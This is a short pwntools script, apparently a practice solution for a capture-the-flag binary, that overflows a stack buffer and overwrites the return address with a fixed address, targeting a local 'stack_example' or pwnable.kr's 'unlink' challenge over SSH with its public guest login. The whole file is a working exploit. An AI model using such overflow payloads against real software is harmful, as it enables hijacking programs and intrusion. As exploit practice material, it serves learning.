#!/usr/bin/env python
#-*- coding:utf-8 -*-
from pwn import *

vunlu_addr = 0x08048436
DEBUG = True
#context.log_level = "debug"
if DEBUG:
	io = process("./stack_example")
	
else:
	s =  ssh(host='pwnable.kr',
         port=2222,
         user='unlink',
         password='guest'
        )
	io = s.process("./unlink")
#gdb.attach(io,"b *0x0000065B")
#context.log_level = "debug"
payload = ""
payload += "A"*0x14# 覆盖ret
payload += "junk"
payload += p32(vunlu_addr)# 覆盖ret
io.sendline(payload)
io.interactive()
